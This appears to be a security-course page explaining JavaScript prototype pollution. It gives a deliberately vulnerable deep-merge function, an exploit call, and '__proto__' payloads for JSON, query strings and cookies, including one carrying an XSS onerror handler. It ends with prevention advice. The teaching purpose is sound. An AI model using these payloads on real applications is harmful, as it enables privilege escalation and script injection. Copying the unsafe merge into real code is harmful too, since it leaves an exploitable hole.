# Prototype Pollution

Prototype pollution is a JavaScript vulnerability where an attacker injects properties into Object.prototype.

## How It Works
```javascript
// Vulnerable merge
function merge(target, source) {
    for (let key in source) {
        if (isObject(source[key])) {
            target[key] = merge(target[key] || {}, source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

// Exploit
merge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
// Now every object has isAdmin = true
```

## Attack Vectors
- **JSON.parse** - {"__proto__": {"isAdmin": true}}
- **Query strings** - ?__proto__[isAdmin]=true
- **HTTP headers** - Cookie: __proto__=true

## Vulnerable Libraries
- jQuery ($.extend with deep=true)
- Lodash (_.merge, _.defaultsDeep)
- Express (qs parser - fixed in later versions)
- Mongoose (schema injection)

## Exploitation Chains
```json
{"__proto__": {"isAdmin": true, "role": "admin"}}
{"__proto__": {"innerHTML": "<img src=x onerror=alert(1)>"}}
{"__proto__": {"authorized": true}}
```

## Prevention
1. Use Map instead of Object for key-value storage
2. Set prototype to null - Object.create(null)
3. Use safe merge functions that reject __proto__
4. Validate input keys - reject __proto__, constructor, prototype
5. Use Object.freeze(Object.prototype)

---

> **Next**: [LLM / AI Security](17-llm-ai-security.md)
